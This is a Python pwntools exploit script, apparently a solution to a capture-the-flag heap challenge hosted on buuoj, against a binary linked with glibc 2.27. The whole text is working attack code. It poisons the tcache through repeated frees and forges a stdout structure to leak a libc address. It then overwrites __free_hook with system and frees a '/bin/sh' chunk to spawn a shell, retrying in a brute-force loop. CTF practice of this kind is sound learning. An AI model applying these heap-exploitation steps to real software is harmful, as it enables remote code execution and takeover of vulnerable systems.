from pwn import *
import sys
context.log_level='debug'
debug = 0
file_name = './pwn'
libc_name = './libc-2.27.so'
ip = 'node3.buuoj.cn'
prot = '28510'

file = ELF(file_name)

sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True,timeout=3)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()


def create(chunk_size,value):
    ru('>> ')
    sl('1')
    ru('Size?')
    sl(str(chunk_size))
    ru('Content?')
    sd(value)

def delete():
    ru('>> ')
    sl('2')
def debug():
    gdb.attach(r)
    # raw_input()

while True:
	try:
		#r = process("./pwn")
		r = remote(ip,int(prot))
		libc = ELF(libc_name)
		create(0x68,"a")
		create(0,"")#free
		create(0x98,"b")
		create(0,"")#free
		create(0xa8,"c")
		create(0,"")#free
		create(0x98,"d")

		for x in range(7):
		    delete()		
		create(0,"")#free

		create(0x68,"e")
		#create(0x70,"a")
		create(0x100,"a"*0x68+p64(0x31)+"\x60\x77")
		create(0,"")#free
		create(0x98,"f")
		create(0,"")#free
		#debug()
		create(0x98,p64(0xfbad1800)+p64(0)*3+"\x00")
		date = rud('>> ')
		if "\x7f" not in date:
		    raise EOFError;
		puts_sym = libc.symbols['puts']
		li("puts_sym",puts_sym)
		libc_base = u64(date[0x59:0x59+6]+"\x00\x00")-0x3e82a0
		li("libc_base",libc_base)
		free_hook = libc_base+libc.symbols['__free_hook']
		system = libc_base+ libc.symbols['system']
		sl("666")
		create(0x100,"b"*0x68+p64(0x41)+p64(free_hook))
		create(0,"")
		create(0x20,"a")
		create(0,"")
		create(0x20,p64(system))
		create(0,"")
		create(0x50,"/bin/sh\x00")
		delete()
		#debug()
		ri()
	except EOFError:
	    r.close()